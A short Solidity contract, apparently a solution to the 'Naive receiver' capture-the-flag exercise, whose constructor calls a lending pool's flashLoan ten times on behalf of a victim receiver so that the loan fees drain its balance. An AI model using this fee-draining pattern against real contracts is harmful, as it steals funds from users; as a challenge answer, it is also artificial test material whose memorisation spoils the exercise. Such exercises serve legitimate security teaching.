pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverHack {
    constructor(NaiveReceiverLenderPool nrlp, address _flashLoanReceiver) {
        for(uint i = 0; i < 10; i++) {
            nrlp.flashLoan(_flashLoanReceiver, 0);
        }
    }
}